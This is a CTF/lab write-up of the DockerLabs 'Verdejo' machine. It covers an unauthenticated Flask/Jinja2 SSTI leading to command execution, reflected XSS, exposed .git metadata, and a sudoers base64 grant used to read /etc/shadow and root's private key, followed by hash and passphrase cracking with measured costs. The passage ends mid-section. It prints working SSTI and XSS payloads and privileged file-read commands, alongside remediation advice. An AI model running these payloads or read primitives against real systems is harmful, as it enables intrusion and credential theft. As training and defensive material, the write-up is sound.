# VERDEJO — Writeup

**Lab:** DockerLabs id 36, *Fácil* (27th lab in this series)
**Declared objective:** *"Laboratorio para practicar las vulnerabilidades XSS y SSTI, con escalada de privilegios crackeando hashes."*
**Image:** `verdejo:latest` (single image, `sha256:7ae51e135ff2…`, built 2024-05-22, Docker 20.10.25+dfsg1)
**Engagement date:** 2026-09-29

> **Redaction note.** Live target material — the recovered password, the full shadow hash, the salt, the key fingerprint and the key material — is redacted in this document. **The structure is not**, because the structure *is* the finding: the scheme, the field layout, the cost parameters and the salt length are what §4 reasons about, and all of them are shown. A writeup that ships a working credential and a live hash is a writeup that leaks.

---

## 1. Outcome first

| Question | Answer |
|---|---|
| Unauthenticated RCE? | **Yes**, as `uid=1000(verde)` — not root |
| Root? | **No.** One conditional hop short: an **encrypted root private key** was obtained, its passphrase was **not** recovered within a stated budget |
| `FLAG{}`? | **None. Absence proven by exhaustive search, not assumed** |
| Was the declared objective true? | **Partly.** XSS and SSTI are both real and both used. The "privilege escalation by cracking hashes" is **half true**: the hash cracks, and cracking it grants **nothing new** — the account it belongs to is the account the SSTI already gave you |
| Did the lab's own description lie? | On the *type* of vulnerability, **no** — the one thing this series' descriptions usually get wrong, it got right. On the *escalation*, it overstated the chain |

---

## 2. Surface

```
$ nmap -sV -Pn -p- 172.17.0.20
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.59 ((Debian))
8089/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Not shown: 65532 closed tcp ports (conn-refused)
```

Base OS is **Debian 12 (bookworm)**. Stack pinned from `requirements.txt`, shipped inside the docroot:

```
Flask==2.2.2   itsdangerous==2.1.2   Jinja2==3.1.2
MarkupSafe==2.1.1   Werkzeug==2.2.2
```

The container entrypoint is the whole story of the privilege model, and it is worth quoting because it explains the lab's central oddity:

```
service apache2 start && service ssh start \
  && su - verde -c "python3 /var/www/html/ssti/__init__.py" && tail -f /dev/null
```

**The SSTI service is deliberately run as `verde`, not as root.** The design intent is visible in the Dockerfile the image ships.

| Port | Role | Identity it runs as |
|---|---|---|
| 8089 | Flask/Jinja2 app, Werkzeug dev server, `debug=False` | `verde` (uid 1000) |
| 80 | Apache serving `/var/www/html` — **including the app's own source, its `.git`, and its `venv/`** | `www-data` |
| 22 | OpenSSH; server offers `publickey, password` for **both** `root` and `verde` | — |

---

## 3. Attack chain

```
  ?user={{ cycler.__init__.__globals__.os.popen('id').read() }}
        │  CWE-1336 SSTI, unauthenticated
        ▼
  uid=1000(verde) gid=1000(verde) groups=1000(verde)          ← RCE, not root
        │  sudoers: verde ALL=(root) NOPASSWD: /usr/bin/base64
        ▼
  sudo -n /usr/bin/base64 -w0 /etc/shadow                     ← root FILE READ
  sudo -n /usr/bin/base64 -w0 /root/.ssh/id_rsa                ← root FILE READ
        │
        ├──▶ yescrypt hash of `verde` ── cracked ──▶ green-team word (2.3 s)
        │                                              (grants NOTHING new: already verde)
        │
        └──▶ root private key, aes256-ctr + bcrypt r=16 ── passphrase NOT recovered
                                                          ⇒ root NOT reached
```

### 3.1 SSTI → RCE (CWE-1336)

Read first, per §7. The whole bug is three lines of `__init__.py`:

```python
template = template + '''
    <h1>Hola {}</h1>
    '''.format(user) + footer        # <-- request value spliced into template SOURCE
...
return render_template_string(template)   # <-- SOURCE is then COMPILED
```

`render_template_string` compiles its argument. `str.format` put attacker bytes *into the source* before compilation. The safe alternative is `render_template(<fixed file>, user=user)`.

**Positive control** (evaluation, not reflection):

```
?user=hola                  →  <h1>Hola hola</h1>          (literal)
?user={{7*7}}               →  <h1>Hola 49</h1>             (evaluated)
?user={{''.__class__}}      →  <h1>Hola &lt;class &#39;str&#39;></h1>
```

The third line matters more than the second, and it is the trap. **Jinja2 autoescaping is ON** — the `__class__` output came back HTML-escaped — and it protects nothing here, because the attack is at the **source** layer, not the output layer. A tester who sees `&lt;` and concludes "escaping is on, template injection is out" has measured the wrong layer.

**Identity, measured first, as the identity:**

```
?user={{ cycler.__init__.__globals__.os.popen('id').read() }}
→ Hola uid=1000(verde) gid=1000(verde) groups=1000(verde)
```

`uid=1000`, not `0`. Everything downstream follows from that one line: the sudoers grant is now reachable, and no further hop is needed to become `verde`.

### 3.2 The sudoers grant: this is a READ primitive, not RCE

```
$ sudo -n -l            (as verde)
User verde may run the following commands on 33d7f898585e:
    (root) NOPASSWD: /usr/bin/base64
```

The repo's doctrine classifies interpreter grants into *argument-taking* and *runtime-spawned shell*, and **both classes are RCE**. `base64` is a third class that class misses, and misclassifying it is the difference between a Critical and an Information-with-Impact finding.

**The classification test, and it is one command:**

```
$ sudo -n /usr/bin/base64 --help
Usage: /usr/bin/base64 [OPTION]... [FILE]
Base64 encode or decode FILE, or standard input, to standard output.
  -d, --decode          decode data
  -i, --ignore-garbage  ...
  -w, --wrap=COLS       ...

$ sudo -n /usr/bin/base64 -o /tmp/x
/usr/bin/base64: invalid option -- 'o'
```

`base64` writes **to standard output only**. It has no output-file option. So the grant confers **root-executed arbitrary file *read***, and confers no write at all.

**The control that proves the write is not privileged** — the shell redirect belongs to `verde`, so measuring it is the only way to know which identity performs it:

```
$ rm -f /tmp/pwn; printf "aW91ZCAxCg==" | sudo -n /usr/bin/base64 -d > /tmp/pwn
$ ls -la /tmp/pwn ; stat -c "%U %a" /tmp/pwn
-rw-r--r-- 1 verde verde 7 /tmp/pwn
verde 644
```

**The control that proves the path restriction holds** (so the defect is *which program was trusted*, not "sudo is loose"):

```
/usr/bin/base64 --version  → base64 (GNU coreutils) 9.1   rc=0
/usr/bin/id   /bin/id   /usr/bin/cat   /usr/bin/tee   /bin/sh
  → sudo: a password is required            (all five)
```

### 3.3 What the read primitive actually buys

```
$ sudo -n /usr/bin/base64 -w0 /etc/shadow | base64 -d | grep ^verde
verde:$y$j9T$<22-char-salt>$<43-char-derived-key>:19864:0:99999:7:::

$ find /root -maxdepth 3            # as verde
/root                                 # no traversal permission — the grant is what opens it

$ sudo -n /usr/bin/base64 -w0 /root/.ssh/id_rsa > id_rsa.b64
$ ssh-keygen -lf id_rsa
4096 SHA256:<redacted> no comment (RSA)
```

**The key is root's, proven by fingerprint, not assumed** (the two fingerprint values are byte-identical — that identity *is* the proof, so only one is shown, redacted):

| Source | Fingerprint |
|---|---|
| public key recovered from the **encrypted** private file's cleartext region | `4096 SHA256:<redacted>` |
| `/root/.ssh/authorized_keys` (read via the grant) | `4096 SHA256:<redacted> root@2b3afb1aee62` |

So the chain to root is **mechanically complete and conditional on one passphrase**. The honest rate is: *root is one passphrase away, and the passphrase was not recovered.* It is not "root achieved."

### 3.4 Apache serves the source, the `.git`, and the `venv` (CWE-527 / CWE-538)

Unauthenticated, on port 80, no trickery:

```
/ssti/.git/HEAD          → 200  21 B     ref: refs/heads/main
/ssti/.git/config        → 200  283 B
/ssti/.git/packed-refs   → 200  112 B
/ssti/.git/index         → 200  918 B
/ssti/__init__.py        → 200  1141 B   (the vulnerable source, verbatim)
/ssti/venv/              → 200  (full virtualenv: bin/, lib/, lib64/, pyvenv.cfg)
```

`.git/config` leaks the internal upstream:

```ini
[remote "origin"]
	url = https://github.com/filipkarc/ssti-flask-hacking-playground.git
```

Impact here is low — the app is a public toy — but the two components are separately reportable: **directory contents of a code repository reachable without authentication** (CWE-527) and **internal repository metadata in a publicly accessible file** (CWE-538). A dumb-HTTP `git clone` does *not* work (`objects/info/packs` → 404, `git fetch` → `repository not found`), so the *history* is not exfiltrable; the *working tree* is, trivially, and that is enough to hand an attacker the exact source of the sink.

---

## 4. The hash section

This is the part of the lab the description advertises, and the part the report has to get right. **The credential is evidence; the weakness is the finding.** Both hashes here are at distribution-default cost, so *neither* is a weak-hash finding — and one of them is worthless as an escalation. Saying that clearly is the deliverable.

### 4.1 `verde` — `/etc/shadow`, **yescrypt**

```
verde:$y$j9T$<22-char-salt>$<43-char-derived-key>:19864:0:99999:7:::
      │  │     │                    │
      │  │     │                    └── derived key, 43 b64 chars (32 bytes, tlen=32)
      │  │     └── per-user random salt, 22 chars
      │  └── parameter triplet
      └── scheme id: yescrypt (libxcrypt)
```

Format read: **modular crypt, scheme `$y$` = yescrypt, salt is 22 chars of per-user random material, and the cost is carried in the `j9T` parameter triplet rather than in a `rounds=` field** — which is the structural difference from `$2b$` bcrypt and the reason an off-the-shelf hashID is the wrong first move here.

**Cost, measured — not read off the parameters:**

| Quantity | Measured |
|---|---|
| Cost per candidate (single core, host libxcrypt, idle) | **21.4 ms** |
| Cost per candidate (same host, under a concurrent 5-worker sweep) | **11.8 ms** — the box is shared, so quote a range, not a point |
| Throughput, single core | **47–90 cand/s** |
| Cost of the repo's full 517,503-line list, single core | **2.6–3.1 hours** |
| Throughput with 5 workers | **~170 cand/s** |

**Is `j9T` below the distribution default? Measured, and the answer is no.** The parameter triplet looks like a suspiciously small `N` read as a string, and I was about to file a CWE-916 on exactly that reading. The measurement that refutes it: a **throwaway account created on the same image with the same tool the build used** (`useradd` + `chpasswd`) comes out with the *identical* triplet.

```
$ useradd -m probeuser ; echo "probeuser:ProbeControl1" | chpasswd
$ grep ^probeuser /etc/shadow | cut -d: -f2
$y$j9T$ciNKlplhoHaSXm.uqJiyF0$c0PftUEJQ4pwRUzsIrjvBl4rr8NmMi9wR5KIuhIptN1
       ^^^^  identical to the target
```

That account is also the **positive control for the verifier itself** — a yescrypt hash whose plaintext I chose. Same scheme, same params, **different salt**, which is the per-user property the scheme exists to provide:

```
same scheme      : True
same cost params : True
same salt        : False    (must be False — the salt is per-user)
```

**Verdict: CWE-916 does not apply.** yescrypt at libxcrypt's own default is a strong KDF. The correct report sentence is *"`/etc/shadow` was readable by a non-root account via the sudoers grant"* (CWE-250/732), **not** *"a weak hash was cracked"*.

### 4.2 `root` — `/root/.ssh/id_rsa`, **aes256-ctr + bcrypt_pbkdf**

This is **not a hash**. It is a passphrase-encrypted private key, and the three inputs are the same three, just in a different container:

| Axis | Value |
|---|---|
| Cipher | `aes256-ctr` |
| KDF | `bcrypt` (bcrypt_pbkdf) |
| **Cost** | `rounds = 16` → 65,536 — **the OpenSSH default** |
| Salt | 16 bytes, per key |
| Key size | RSA 4096 |

**Measured cost: 72 ms/candidate via `ssh-keygen`, 84 ms in-process.** The repo's 517,503-line list is **10.0 hours** at 42 cand/s on 5 workers.

**The report sentence: the key is *exposed*; it is not *trivially attackable*.** A default-cost bcrypt_pbkdf is not CWE-328 and not CWE-916. The finding is the exposure (root's key material readable by a non-root account) plus the fact that the passphrase is a single secret standing between `verde` and `root`.

### 4.3 What the crack actually bought — and the number that goes in the report

```
$ yscan.py shadow.txt verde targeted.txt
target scheme/params : $j9T$  salt=<22-char-salt>...
candidates loaded     : 1229
RESULT hit='<recovered-green-phrase>'  candidates=196  elapsed=2.3s  rate=86.1/s
```

**Confirmed end-to-end — a match on the hash is not the confirmation:**

| Account | Password | Result |
|---|---|---|
| `verde` | `<recovered-green-phrase>` | **LOGIN OK** → `uid=1000(verde) gid=1000(verde) groups=1000(verde)` |
| `verde` | `wrongpass` | LOGIN FAILED — `AuthenticationException: Authentication failed.` |
| `root` | `<recovered-green-phrase>` | LOGIN FAILED — `AuthenticationException: Authentication failed.` |
| `verde` | `Verdesito` | LOGIN FAILED — `AuthenticationException: Authentication failed.` |

**And here is the finding nobody writes down: this crack is worth nothing.**

The account whose hash was cracked is `verde` — **and §3.1 had already given me `verde` as an unauthenticated RCE with no credential at all.** The credential recovered a known-plaintext login to an account I was already inside. The honest rate for this credential in the report is:

> 196 candidates, 2.3 s, 86 cand/s, against a yescrypt hash at distribution-default cost — **granting no additional reach, because the account it authenticates to was already the identity the unauthenticated primitive ran as.**

That is the difference between a lab that says *"crack the hash to escalate"* and a lab where the hash is a dead end. A pentest report that prints "password recovered" here has measured a self-confirming loop.

### 4.4 The root key passphrase — a **not recovered**, with numbers

| Candidate set | Size | Result | Elapsed | Rate |
|---|---|---|---|---|
| First 1,000 of `Passwords.txt` | 1,000 | 0 hits | 21.8 s | 45.9/s |
| Targeted, lab vocabulary | 1,229 | 0 hits | 26.5 s | 46.5/s |
| Targeted v2, high-frequency core + mutations | 6,227 | 0 hits | 248.8 s | 25.0/s |
| Lab-relevance filter over the 517,503 list | 3,400 | 0 hits | 137.2 s | 24.8/s |
| Mutations of the credential recovered from `/etc/shadow` | 361 | 0 hits | 16.6 s | 21.7/s |
| `Passwords.txt`, walked from the top and **stopped at 100,000** | 100,000 | 0 hits | 2,461.5 s | 40.6/s |
| **Total** | **112,217** | **0 hits** | ~2,913 s | — |

**Not recovered.** Two things go in the report, and the second is the one clients actually read.

*What was covered:* 100,000 of the 517,503 lines of `Passwords.txt` — **19.3%**, walked from the top of a **lexicographic** file, so the region it reached is roughly `0`–`d`; plus 11,217 targeted candidates across four themed sets. **What was not:** the remaining 417,503 lines, whose projection at the measured 40.6 cand/s is **2.9 further hours** (**3.5 h** to exhaust the list), and the two other repo lists (`sorted-passwords.txt` 101,074, `2025-sort-uniq-words.txt` 131,887) at ~42 min and ~52 min. No `john`, no `hashcat` on this host, so every rate above is CPU-only Python and understates what a GPU would do.

**The stop was a budget decision, and this is the sentence that belongs in the report:**

> The root private key's passphrase was **not recovered** after 112,217 candidates at 20–47 cand/s (2,461 s of the largest single pass). Exhaustive coverage of the available wordlist would require a further **~2.9 hours** of 5-core compute. Offline cracking is the only technique in this engagement whose cost scales directly with the target, and the projection — not the failure count — is the deliverable. **Root is one passphrase away: the key↔`authorized_keys` pairing is proven by matching fingerprint, and the passphrase is the only thing between `verde` and `root`.**

---

## 5. Control tests

Every oracle in this engagement ran a **positive** and a **negative** control before its output was allowed to mean anything. Three of these failed and had to be fixed — see §6.

### 5.1 SSTI oracle

| # | Test | Expected | Observed | |
|---|---|---|---|---|
| 1 | `?user=hola` | literal `Hola hola` | `Hola hola` | pass |
| 2 | `?user={{7*7}}` | `Hola 49` | `Hola 49` | pass |
| 3 | `?user={{''.__class__}}` | escaped, proves autoescape ≠ safety | `Hola &lt;class &#39;str&#39;>` | pass |
| 4 | `?user=<script>alert(1)</script>` | raw reflection in an HTML text node | `<h1>Hola <script>alert(1)</script></h1>` | pass |
| 5 | gadget, **identity first** | non-root | `uid=1000(verde) gid=1000(verde) groups=1000(verde)` | pass |

**The XSS half of the declared objective is real, and it is a separate finding from the SSTI half** even though both flow from one `.format()`. The sink-context test is what separates them: the `<script>` tag is reflected **raw** into an HTML text node (escaping was bypassed because the bytes never passed through an escaper — they were spliced into the source), while `{{…}}` **compiles and runs**. Reflection alone would not have been enough; the `7*7 → 49` is what makes it SSTI, and the raw `<script>` is what makes it also XSS.

### 5.2 Cracker oracles — positive **and** negative

Two self-made encrypted control keys, built with the **same scheme, cipher and cost as the target** (`aes256-ctr`, `bcrypt_pbkdf`, `rounds=16`, RSA 2048), so the oracle is validated against the exact class it will be asked about:

| # | Test | Expected | Observed | |
|---|---|---|---|---|
| C1 | `paramiko` recovers `ctl1`'s own passphrase | `True` | `True` | pass |
| C2 | `ssh-keygen -y -P` recovers `ctl1`'s own passphrase | `True` | `True` | pass |
| C3 | `paramiko` rejects a wrong passphrase on `ctl1` | `False` | `False` | pass |
| C4 | **negative**: `ctl2` must not accept `ctl1`'s passphrase | `False` | `False` | pass |
| C5 | **negative**: the target must not accept either control passphrase | `False` | `False` | pass |
| C6 | **end-to-end positive**: run the *scanner* over a list containing the answer | exactly 1 recovery, at position 3 | `hit='KnownPass1' after 3 candidates` | pass |
| C7 | **end-to-end negative**: run the scanner over a list without it | exactly 0 recoveries | `None after 4 candidates` | pass |
| C8 | yescrypt verifier recovers the control account's known plaintext | `True` | `True` | pass |
| C9 | yescrypt verifier rejects a near-miss | `False` | `False` | pass |
| C10 | **negative**: control plaintext must not verify against the target hash | `False` | `False` | pass |
| C11 | identity check: `sudo /usr/bin/base64` allowed | `rc=0` | `base64 (GNU coreutils) 9.1`, `rc=0` | pass |
| C12 | identity check: `sudo /usr/bin/id`, `/bin/id`, `cat`, `tee`, `/bin/sh` | all `sudo: a password is required` | all five denied | pass |
| C13 | write-identity: the redirect's owning uid | **not** root | `verde 644` | pass |
| C14 | cost-parameter identity: a fresh account on the same image | same triplet as target | `$y$j9T$` on both | pass |
| C15 | key-pairing identity: the public key in the encrypted file vs `authorized_keys` | identical fingerprint | `SHA256:3TOl…998` on both | pass |

**C6/C7 are the shape that matters.** C1–C5 validate the *oracle*; C6/C7 validate the *scanner that calls it*. They are different things, and §6 is the reason I do not treat the first as sufficient.

**Postcondition stated as a count identity, not a verdict:** for any run, *recoveries returned* must equal *hashes known to be in the candidate list*. C6 gave 1 == 1. C7 gave 0 == 0. Had the wiring been broken, both sides would have been 0 == 0 and looked identical to a target that resisted — which is exactly what happened once, and is written up next.

### 5.3 The control that **held**, and is a finding in the defender's favour

* **`PermitRootLogin` was not weakened.** `/etc/ssh/sshd_config` sets no `PermitRootLogin`, and the live server offers `publickey, password` for `root` — i.e. Debian's `prohibit-password` default. So root login is *possible by key* and *not by password*; the negative control `root / <recovered-green-phrase> → LOGIN FAILED` is this control working, not a missing hash.
* **The sudoers path restriction held** (C12). The grant names one binary; five neighbours were denied.
* **`base64` genuinely has no write primitive** (C13), so the escalation did not exist and no amount of payload engineering would have produced one.
* **No SUID, no capabilities, no cron, no Docker socket.** `find / -perm -4000 -o -perm -2000` returned the stock Debian set; `getcap -r /` returned nothing; `/etc/cron.d` held only `e2scrub_all`; `/var/run/docker.sock` does not exist. **The privilege boundary held everywhere except the one sudoers line** — which is why the honest chain length is a property of the lab, not a guess.

---

## 6. Autocorrección — three things I got wrong, and what caught them

Written prominently because all three produced a *confident, publishable, wrong* result, and two of them would have become findings.

### 6.1 I was about to file CWE-916 on a hash that is at default cost

**What I believed:** the parameter triplet `j9T` decodes to a small `N` (the encoding is `N = 1 << (param[0] & 0x3F)`, which reads as a low work factor), so yescrypt here is configured below the distribution default → **CWE-916, Use of Password Hash With Insufficient Computational Effort**.

**Why the belief was wrong:** the triplet is libxcrypt's *own default*. I inferred a weakness from a parameter **string** without ever measuring the cost.

**What caught it:** C14 — a throwaway account created on the same image with the same tool the build used. Identical triplet. The CWE-916 finding was deleted before it was ever written.

> **Rule:** a KDF parameter is not a finding until you have compared it to a **measured** baseline produced by the *same distribution, same tool, same version*. Reading `N=512` off a parameter string and calling it weak is the same move as reading a status code and calling it vulnerable.
>
> **And the cheap way to get the baseline is a control you build in a throwaway instance, not a document you look up** — because the document tells you the upstream default while the target may have been reconfigured, and here the target *was not*, and I would have reported a finding that did not exist.

### 6.2 My first OpenSSH oracle returned `False` for a passphrase it should have recovered

**Symptom:** `try_pw('KnownPass1', ctl1)` → `False`, where `ctl1` is a key I had just created with exactly that passphrase, and which `ssh-keygen -y -P 'KnownPass1'` opened without complaint.

**Why it matters more than a normal bug:** the failure is **indistinguishable from "the passphrase is strong"**. A negative from this oracle is byte-for-byte what a positive is when the passphrase is unguessable. Had I pointed it at the target and reported *"the root key passphrase resisted 517,503 candidates"*, I would have been reporting a failure to find a bug in my own parser.

**Root cause, after four wrong guesses at the layout** (salt truncated to 8 bytes instead of 16; `nkeys` read as a length-prefixed string when it is a bare `uint32`; the private section treated as the buffer remainder when it is itself length-prefixed; the CTR counter taken as a 64-bit int when OpenSSH's IV is a full 16-byte block). The fix was to **stop reading the spec from memory and calibrate against a key whose passphrase I set** — which is what the control was for.

**Correction applied:** the oracle was abandoned for `paramiko`, which is a *different implementation* from the `ssh-keygen` that will actually consume the key, and both were then cross-checked against each other (C1 vs C2).

> **Rule: the positive control of a cracker is not "the hash matches" — it is "the cracker recovers a hash you already had the plaintext to".** And the failure of that control looks *exactly* like the success in the interesting case, which is why the correct postcondition is a **count identity** (recoveries == expected recoveries), never a boolean verdict.

### 6.3 The yescrypt scanner reported "not found" for 1,000 candidates in 0.1 seconds

```
RESULT hit=None  candidates=1000  elapsed=0.1s  rate=10705.7/s
```

**A KDF that costs 21 ms cannot be tried 10,705 times per second.** The rate was the tell, before I looked at anything else.

**Root cause:** the scanner read the hash field as `split(':')[1]` of the **first** line of `/etc/shadow` — which is `root`, whose field is `*`. `crypt()` rejects `*` and returns `*0` **immediately, without running the KDF**. So the scanner was not slow, and it was not failing to find the password; **it was not attempting a KDF at all**, and its "not found" was a statement about my own argument list.

**Correction applied:** the control was moved **inside the scanner**. Every run now first verifies a hash whose plaintext is known and **aborts** if it cannot recover it, and separately aborts if *everything* verifies. Then:

```
target scheme/params : $j9T$  salt=<22-char-salt>...
RESULT hit=None  candidates=1000  elapsed=5.9s  rate=170.0/s
```

Same list, same "no hit" verdict — and now a rate that is physically possible, which is what makes the negative trustworthy.

> **Rule: a control that runs once, by hand, is not a control — it is a memory of a control.** The instrument must carry it, because the wiring between the oracle and the data is where the failure lives, and the wiring is not re-checked by a test suite.
>
> **And the generalisable tell for any offline verifier: watch the rate, not just the verdict.** A KDF cracker that is *faster* than the KDF is a measurement of your own plumbing. Offline verifiers fail **silently and instantly**, with no error, no exception and no exit code — strictly worse than an online oracle, which at least costs a round trip and can fail loudly. **Treat an implausible rate as a failed control, not as a fast target.**

### 6.4 Smaller corrections, for the record

* I first read `kdfopt` as 8 bytes of salt and got a 16-byte-per-user salt only because the length arithmetic did not close. **A parameter block that does not sum to its own declared length is a parse error, not a value.**
* `crypt(pw, "$y$")` does not return the library's default parameters — it returns `*0`, because the salt is empty. **There is no API that hands you "the default"; the only way to learn the default is to make a hash with the default tool.** That is the whole of §6.1.
* I assumed `/root` was unreachable and searched for a write primitive before reading `base64 --help`. The grant is a *read* primitive, which is a materially smaller finding. **Read the tool's own interface before designing an escalation against it.**

---

## 7. Findings

### F1 — Unauthenticated Server-Side Template Injection → RCE as `verde` — **CWE-1336** — High

**Evidence.** `__init__.py` splices `request.args['user']` into template *source* with `str.format`, then calls `render_template_string`:

```
?user={{7*7}}    →  <h1>Hola 49</h1>
?user={{ cycler.__init__.__globals__.os.popen('id').read() }}
                  →  Hola uid=1000(verde) gid=1000(verde) groups=1000(verde)
```

**Impact.** Unauthenticated command execution on the host as an unprivileged service account, with no credential and no session. From there, the sudoers grant of §F2 is immediately reachable.

**Root cause.** Untrusted input composed into a template *string* rather than passed to `render_template` as a *variable*. Autoescaping is enabled and irrelevant: it operates on output, and the attacker controls the source.

**Remediation.** `return render_template("index.html", user=user)`. Never call `render_template_string` on a string that any request data can reach — including when that data is only `.format()`-substituted one level down. Autoescape is not a mitigation for this class.

### F2 — Sudoers grants a non-root account a root-executed file reader — **CWE-250 / CWE-732** — High

**Evidence.**

```
verde	ALL=(root) NOPASSWD: /usr/bin/base64
$ sudo -n /usr/bin/base64 -w0 /etc/shadow        → full /etc/shadow
$ sudo -n /usr/bin/base64 -w0 /root/.ssh/id_rsa  → root's private key
$ sudo -n /usr/bin/base64 --help                 → "...to standard output"  (no -o)
$ printf "aW91ZCAxCg==" | sudo -n base64 -d > /tmp/pwn
$ stat -c "%U %a" /tmp/pwn                       → verde 644      (the write is NOT root)
$ sudo -n /usr/bin/{id,cat,tee} /bin/{id,sh}     → all "sudo: a password is required"
```

**Impact.** **Arbitrary root-only file read**, as a passwordless, non-interactive, non-logged-in account. The result in this lab is total compromise of credential confidentiality: the full password database and root's SSH private key. `root`'s home is `0700`, so without this grant it is unreachable — the grant is the entire traversal.

**Root cause.** A filter binary granted with `NOPASSWD` and an unrestricted argument list. The policy trusts a program whose only capability is to *read*; a filter is the wrong class of program for any privilege grant, because its value to an attacker is entirely in the **file name it is handed**.

**Remediation.** Delete the line. If a base64 helper is genuinely needed, expose it as a purpose-built binary that accepts no file argument, and grant it with an explicit `Cmnd_Alias` argument list. Broader rule: **never grant `NOPASSWD` to a program that takes a path as an argument.**

**Classification note for the repo's existing sudoers doctrine.** That doctrine has two classes — *argument-taking* and *runtime-spawned shell* — and **both are RCE**. `base64` is a **third class: argument-taking, but the argument is a file to read and the tool has no output-file option, so the grant is a confidentiality primitive, not code execution.** Report it as such. Filing it as "sudo to an interpreter, therefore RCE" would be wrong in both directions: it would overstate the primitive and send the reviewer to patch the wrong thing.

### F3 — Reflected XSS in the same parameter — **CWE-79** — Medium

**Evidence.**

```
?user=<script>alert(1)</script>  →  <h1>Hola <script>alert(1)</script></h1>
?user=hola                        →  <h1>Hola hola</h1>                (control)
```

Reflection is into an **HTML text node** with no escaping, per the sink-context test — not into a JSON string, not an attribute. There is no session cookie or authentication in this app, so the practical ceiling is script execution in an origin that holds nothing; the rate is Medium on the strength of the primitive, not on a demonstrated account takeover, and this report does **not** claim one.

**Root cause.** Same `.format()` splice as F1, reaching the output layer as well as the source layer.

**Remediation.** F1's fix removes both. If the value must be rendered, `render_template` with autoescaping on is sufficient; if it must be HTML, sanitize it.

### F4 — Application source, Git metadata and a full virtualenv served unauthenticated — **CWE-527 / CWE-538** — Low

**Evidence.** `/ssti/.git/HEAD` `200`, `/ssti/.git/config` `200` (leaks the upstream repository URL), `/ssti/.git/index` `200`, `/ssti/__init__.py` `200`, `/ssti/venv/` `200` with `bin/ lib/ lib64/ pyvenv.cfg` browsable. History is *not* exfiltrable — `objects/info/packs` is `404` and `git fetch` over dumb HTTP fails — so the working tree is the whole of the exposure.

**Impact.** Low in this lab, because the application is a public toy. The finding is the **pattern**: an Apache `DocumentRoot` pointing at a checkout that includes the checkout metadata.

**Remediation.** Serve the application directory from a path outside the document root, or deny `.git` and `venv` explicitly. `git clone` into a deployment directory is the root cause; deploy a build artifact.

### F5 — Credential exposure — **reported, explicitly NOT a weak-hash finding**

> `/etc/shadow` was readable by a non-root account (via F2). The `verde` entry is **yescrypt at libxcrypt's default cost** — measured at 21.4 ms/candidate, and confirmed at the *identical* parameter triplet by a control account created on the same image. It was cracked in **196 candidates / 2.3 s** and the credential authenticates successfully to `verde` over SSH. **This is a credential-exposure finding (CWE-522 / CWE-250), not CWE-328 and not CWE-916**, and the credential itself **grants no additional reach**, because the SSTI primitive already ran as `verde`.

> Root's RSA-4096 private key was readable via the same grant. It is encrypted with `aes256-ctr` under **bcrypt_pbkdf at `rounds=16`, the OpenSSH default** — a strong KDF. The key is **exposed but not trivially attackable**. Its passphrase was **not recovered** after **112,217 candidates** across six candidate sets at 20–47 cand/s (§4.4); exhausting the available 517,503-line list projects to a further **~2.9 h** of 5-core compute. Root was not obtained.

**Why this is written as a note and not a numbered finding:** the weakness that made both hashes attackable is **F2**. Reporting "credential cracked" as its own finding would attribute to the crypto a defect that lives in the sudoers line.

---

## 8. "Not recovered" vs "ruled out, with reason"

The distinction is the deliverable of this section. Nothing below is a gap dressed as a negative.

### 8.1 Not tested (no time / out of budget)

| Item | Why not | What it would have cost |
|---|---|---|
| Full 517,503-line list against the root key | stopped at **100,000** (19.3%) by the budget decision in §4.4; 2.9 h would remain | ~2.9 h |
| `sorted-passwords.txt` (101,074) and `2025-sort-uniq-words.txt` (131,887) against the root key | same 72 ms/candidate, same lexicographic prior; a second and third multi-hour pass | ~42 min, ~52 min |
| Brute force beyond the lists (masks, rule-based mutation of a frequency core) | unbounded; a lab passphrase is not a masked one | — |
| GPU offload | no `hashcat`, no `john` on this host; the rate above is CPU-only and the report says so | — |

### 8.2 Ruled out, with the reason

| Item | Verdict | Reason |
|---|---|---|
| Root escalation via a **write** through the sudoers grant | **Impossible** | `base64 --help` shows stdout-only output; `-o` is rejected; the shell redirect's owning uid is `verde` (C13) |
| SUID / file-capability escalation | **Absent** | `find / -perm -4000 -o -perm -2000` → stock Debian set; `getcap -r /` → empty |
| Cron-based escalation | **Absent** | `/etc/cron.d` holds only `e2scrub_all`; no `/var/spool/cron/crontabs` |
| Docker-socket escape | **Absent** | `/var/run/docker.sock` does not exist |
| Root login by password | **Blocked** | `PermitRootLogin` unset → `prohibit-password`; live server offers `publickey, password`; `root / <recovered-green-phrase>` → `AuthenticationException` |
| Root login by the recovered key | **Conditional** | key↔`authorized_keys` pairing **proven** by matching fingerprint; blocked solely on the passphrase (§4.4) |
| Git history exfiltration | **Impossible** | `objects/info/packs` → `404`; `git fetch` → `repository not found` |
| Weak-hash finding on either hash | **Refuted** | yescrypt triplet matched a fresh control account on the same image (C14); key KDF at OpenSSH's default `rounds=16` |
| Stored XSS | **Not present** | one reflected parameter, no persistence, no second user in the app |
| SSTI → root directly | **Not available** | the app is launched under `su - verde`; the gadget returned `uid=1000`, and no other route to root exists from `verde` except F2 |

### 8.3 Reward

```
$ grep -rIl "FLAG{" / --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev
(no output)
$ for u in :8089/ :8089/static/ :/ ; do curl -s $u | grep -coE 'FLAG\{' ; done
0
0
0
```

`/root/flag.txt`, `/root/flag`, `/root/.flag` and `/root/secret.txt` were each requested through the F2 grant and each returned `No such file or directory`. **There is no reward in this lab.** Reported as absence, with the search and the four root-only paths named — not as a value, and not rounded off.

---

## 9. Design observation — the lab teaches the wrong lesson, deliberately

The lab ships the public `ssti-flask-hacking-playground` and adds a sudoers grant and a root key. Its description promises *"privilege escalation by cracking hashes"*, and the hashes are real and crackable. **But the crackable one belongs to the account the SSTI already gave you.** The escalation that actually exists runs the other way:

> **You do not crack your way up. You use a misconfigured sudoers line to read a root key, and then you are one passphrase from root — which is a different problem, with a different cost, and a different report.**

That is an unusually honest lesson, arriving by accident. The conventional shape of this lab would be `SSTI → user → crack that user's hash → SSH as that user → sudo → root`, and it would be a **self-confirming loop** in the middle: the hash protects an account the attacker already owns, so the report would print "credential cracked" while the reachability of that credential had never changed. A tester who reports the credential as a finding has measured a fact about their own position and filed it as a fact about the target's.

Two smaller design points:

